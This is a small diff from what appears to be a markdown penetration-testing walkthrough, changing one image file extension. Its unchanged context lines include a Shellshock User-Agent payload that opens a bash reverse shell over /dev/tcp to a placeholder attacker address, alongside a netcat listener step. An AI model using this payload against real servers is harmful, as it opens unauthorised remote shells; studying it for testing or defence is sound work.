@@ -197,7 +197,7 @@ __Start netcat__
 - __`use the below payload in user agent command:`__
     - __`() { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/<yourip>/1234 0>&1'`__
 
-![image5](/Image/user_agent1.jpg)
+![image5](/Image/user_agent1.png)
 
 
 # Check list
